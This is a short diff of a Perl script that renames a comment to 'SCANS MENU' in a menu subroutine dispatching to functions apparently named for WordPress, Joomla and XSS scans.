-## SCANS ARGUMENTS
+## SCANS MENU
 sub Menu { 
-  ## SCANS MENU
   if (defined $WpSites) { WpSites(); }
   if (defined $JoomSites) { JoomSites(); }
   if (defined $xss) { xss(); }
